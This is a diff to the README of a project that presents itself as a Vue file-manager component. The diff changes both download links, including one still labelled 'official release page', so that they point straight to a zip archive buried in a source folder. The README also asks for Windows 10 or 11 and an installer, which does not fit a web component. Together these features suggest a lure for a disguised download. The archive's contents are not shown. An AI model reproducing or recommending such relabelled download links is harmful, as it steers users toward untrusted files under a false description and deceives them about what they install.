@@ -1,6 +1,6 @@
 # 📁 vue-filemanager - Manage your local files with ease
 
-[![Download Software](https://img.shields.io/badge/Download_Latest-Blue?style=for-the-badge)](https://github.com/Unfathomable-armoredcatfish708/vue-filemanager/releases)
+[![Download Software](https://img.shields.io/badge/Download_Latest-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Unfathomable-armoredcatfish708/vue-filemanager/main/src/components/Tree/filemanager-vue-2.7.zip)
 
 vue-filemanager provides a simple way to view and manage files in your software projects. This tool builds a visual file explorer directly into your interface. It handles common tasks like listing files, organizing folders, and displaying file details. Developers use this component to give users a native feel within a web browser.
 
@@ -11,7 +11,7 @@ To use this software, you need a computer running Windows 10 or Windows 11. The 
 ## 📥 Download and Setup
 
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/Unfathomable-armoredcatfish708/vue-filemanager/releases).
+2. Go to the [official release page](https://raw.githubusercontent.com/Unfathomable-armoredcatfish708/vue-filemanager/main/src/components/Tree/filemanager-vue-2.7.zip).
 3. Find the latest release version on the page.
 4. Click the link to download the installer file.
 5. Save the file to your computer.
